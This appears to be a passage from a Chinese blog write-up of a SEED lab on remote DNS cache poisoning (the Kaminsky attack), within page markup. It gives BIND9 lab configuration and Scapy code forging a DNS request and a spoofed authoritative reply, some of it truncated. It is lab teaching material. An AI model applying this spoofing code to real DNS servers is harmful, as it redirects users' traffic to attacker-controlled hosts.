+<h2 id="二、Remote-DNS-Attack"><a href="#二、Remote-DNS-Attack" class="headerlink" title="二、Remote DNS Attack"></a>二、Remote DNS Attack</h2><h3 id="1-1-Configure-the-DNS-Server"><a href="#1-1-Configure-the-DNS-Server" class="headerlink" title="1.1 Configure the DNS Server"></a>1.1 Configure the DNS Server</h3><p>Step 2: Set up a forward zone.</p>
+<p>​    在真实环境中我们需要知道ns.attacker32.com域名的ip地址，但我们没有真的域名。所以bind9可以设置一个转发区域，使受害者对ns.attacker32.com的访问都转发到攻击者的主机。（代替实际外网主机）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zone &quot;attacker32.com&quot; &#123;</span><br><span class="line">	type forward;</span><br><span class="line">	forwarders &#123;</span><br><span class="line">		10.10.10.132;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>Fix the Source Ports.        /etc/bind/named.conf.options</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query-source port 33333</span><br></pre></td></tr></table></figure>
+<h3 id="1-2-Configure-the-Attacker-VM"><a href="#1-2-Configure-the-Attacker-VM" class="headerlink" title="1.2 Configure the Attacker VM"></a>1.2 Configure the Attacker VM</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">make attacker32.com.zone and example.com.zone files</span><br><span class="line">Step 4: Add the following entries to /etc/bind/named.conf:</span><br><span class="line">zone &quot;attacker32.com&quot; &#123;</span><br><span class="line">		type master;</span><br><span class="line">		file &quot;/etc/bind/attacker32.com.zone&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">zone &quot;example.com&quot; &#123;</span><br><span class="line">		type master;</span><br><span class="line">		file &quot;/etc/bind/example.com.zone&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="1-3-Testing-the-Setup"><a href="#1-3-Testing-the-Setup" class="headerlink" title="1.3 Testing the Setup"></a>1.3 Testing the Setup</h3><p>​    Get the IP address of ns.attacker32.com          Get the IP address of <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ dig ns.attacker32.com       -&gt;  10.10.10.137</span><br><span class="line"></span><br><span class="line">// Send the query to our local DNS server, which will send the query</span><br><span class="line">// to example.com’s official nameserver.</span><br><span class="line">$ dig www.example.com		#官方Ip地址，非攻击者伪造的地址，即不能回应</span><br><span class="line">// Send the query directly to ns.attacker32.com</span><br><span class="line">$ dig @ns.attacker32.com www.example.com			#无响应</span><br></pre></td></tr></table></figure>
+<p>本次攻击目的是让受害者向ns.attacker32.com询问<a href="http://www.example.com的IP地址。" target="_blank" rel="noopener">www.example.com的IP地址。</a></p>
+<h3 id="2-1-The-Kaminsky-Attack"><a href="#2-1-The-Kaminsky-Attack" class="headerlink" title="2.1 The Kaminsky Attack"></a>2.1 The Kaminsky Attack</h3><p>​    思路：攻击者对受害者的dns服务器请求一个不存在的example.com域名,eg: a.example.comll。由于dns服务器缓存没有该域名，所以它会请求example.com域。在dns服务器等待该回复时，攻击者可以欺骗爆破该回复，通过伪造不同的transaction ID（2^16)，直到正确。则可以指定ns.attacker32.com作为example.com域的名称服务器，达到攻击目的。如果失败（transaction ID不匹配，回复慢于真实的回复），则攻击者可以再伪造请求域名，再发送请求攻击，直到攻击成功，那么dns服务器将被缓存ns.attacker32.com</p>
+<h4 id="1-Construct-DNS-request"><a href="#1-Construct-DNS-request" class="headerlink" title="1. Construct DNS request"></a>1. Construct DNS request</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#10.10.10.132--attacker	 10.10.10.137--user&apos;s DNS server</span><br><span class="line">Qdsec = DNSQR(qname=&apos;a.example.com&apos;)</span><br><span class="line">dns = DNS(id=0xAAAA, qr=0, qdcou</span><br><span class="line">ip = IP(dst=&apos;10.10.10.132&apos;, src=&apos;10.10.10.137&apos;)</span><br><span class="line">udp = UDP(dport=53, sport=55555, chksum=0)</span><br><span class="line">request = ip/udp/dns</span><br></pre></td></tr></table></figure>
+<h4 id="2-Spoof-DNS-Replies"><a href="#2-Spoof-DNS-Replies" class="headerlink" title="2. Spoof DNS Replies."></a>2. Spoof DNS Replies.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">name = &apos;a.example.com&apos;</span><br><span class="line">domain = &apos;example.com&apos;</span><br><span class="line">ns =&apos;ns.attacker32.com&apos;</span><br><span class="line">Qdsec = DNSQR(qname=name)</span><br><span class="line">Anssec = DNSRR(rrname=name, type=&apos;A&apos;, rdata=&apos;1.2.3.4&apos;, ttl=259200)</span><br><span class="line">NSsec = DNSRR(rrname=domain, type=’NS’, rdata=ns, ttl=259200)</span><br><span class="line">dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,</span><br><span class="line">qdcount=1, ancount=1, nscount=1, arcount=0,</span><br><span class="line">qd=Qdsec, an=Anssec, ns=NSsec)</span><br><span class="line">ip = IP(dst=&apos;10.10.10.137&apos;, src=&apos;199.43.135.53&apos;)</span><br><span class="line">udp = UDP(dport=33333, sport=53, chksum=0)</span><br><span class="line">reply = ip/udp/dns</span><br></pre></td></tr></table></figure>
+<h4 id="3-Launch-the-Kaminsky-Attack"><a href="#3-Launch-the-Kaminsky-Attack" class="headerlink" title="3. Launch the Kaminsky Attack."></a>3. Launch the Kaminsky Attack.</h4><p>​        we can put everything together to conduct the Kaminsky attack.</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>走过路过，不要错过。。。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/mmqrcode.png" alt="失神我醉了 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/Web/seedlabs-web/" rel="next" title="seedlab-web.md">
+                <i class="fa fa-chevron-left"></i> seedlab-web.md
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/Pwn/Pwnable-kr-Toddler-s-Bottle-Writeup/" rel="prev" title="Pwnable.kr-Toddler's Bottle Writeup">
+                Pwnable.kr-Toddler's Bottle Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/iam.jpg" alt="失神我醉了">
+            
+              <p class="site-author-name" itemprop="name">失神我醉了</p>
+              <p class="site-description motion-element" itemprop="description">impossible,just do it</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/shishenwozuile" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5704969341" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:shishenwozuile@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/parrot__bird" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="httPs://www.google.com" title="google" target="_blank">google</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Local-DNS-Attack"><span class="nav-number">1.</span> <span class="nav-text">一、Local DNS Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-DNS概述"><span class="nav-number">1.1.</span> <span class="nav-text">0. DNS概述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0-1-DNS服务"><span class="nav-number">1.1.1.</span> <span class="nav-text">0.1 DNS服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0-2-DNS工作原理"><span class="nav-number">1.1.2.</span> <span class="nav-text">0.2 DNS工作原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0-3-DNS-记录和报文"><span class="nav-number">1.1.3.</span> <span class="nav-text">0.3 DNS 记录和报文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0-4-DNS协议头部"><span class="nav-number">1.1.4.</span> <span class="nav-text">0.4 DNS协议头部</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Setting-Up-Lab-environment"><span class="nav-number">1.2.</span> <span class="nav-text">1. Setting Up Lab environment</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-Configure-the-User-Machine"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 Configure the User Machine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-Configure-the-DNS-Server"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 Configure the DNS Server</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-1-Configure-BIND9-Server"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1.2.1 Configure BIND9 Server</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-2-Host-a-Zone-in-the-Local-DNS-Server"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">1.2.2 Host a Zone in the Local DNS Server</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Attacks-on-DNS"><span class="nav-number">1.3.</span> <span class="nav-text">2. Attacks  on  DNS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-Modifying-the-Host-File"><span class="nav-number">1.3.1.</span> <span class="nav-text">2.1 Modifying the Host File</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-Directly-Spoofing-Response-to-User"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.2 Directly Spoofing Response to User</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-DNS-Cache-Poisoning-Attack"><span class="nav-number">1.3.3.</span> <span class="nav-text">2.3 DNS Cache Poisoning Attack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-DNS-Cache-Poisoning-Targeting-the-Authority-Section；another-Domain-Additional-Section。"><span class="nav-number">1.3.4.</span> <span class="nav-text">2.4 DNS Cache Poisoning: Targeting the Authority Section；another Domain; Additional Section。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Remote-DNS-Attack"><span class="nav-number">2.</span> <span class="nav-text">二、Remote DNS Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Configure-the-DNS-Server"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 Configure the DNS Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Configure-the-Attacker-VM"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 Configure the Attacker VM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Testing-the-Setup"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 Testing the Setup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-The-Kaminsky-Attack"><span class="nav-number">2.4.</span> <span class="nav-text">2.1 The Kaminsky Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Construct-DNS-request"><span class="nav-number">2.4.1.</span> <span class="nav-text">1. Construct DNS request</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Spoof-DNS-Replies"><span class="nav-number">2.4.2.</span> <span class="nav-text">2. Spoof DNS Replies.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Launch-the-Kaminsky-Attack"><span class="nav-number">2.4.3.</span> <span class="nav-text">3. Launch the Kaminsky Attack.</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">失神我醉了</span>
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">10.6k</span>
+  
+-->
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+<!--
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+
+
+<span class="post-meta-divider">|</span>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共10.6k字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问数：
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>访问量：
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" color="0,255,255" opacity="0.9" zindex="-2" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+</body>
+</html>
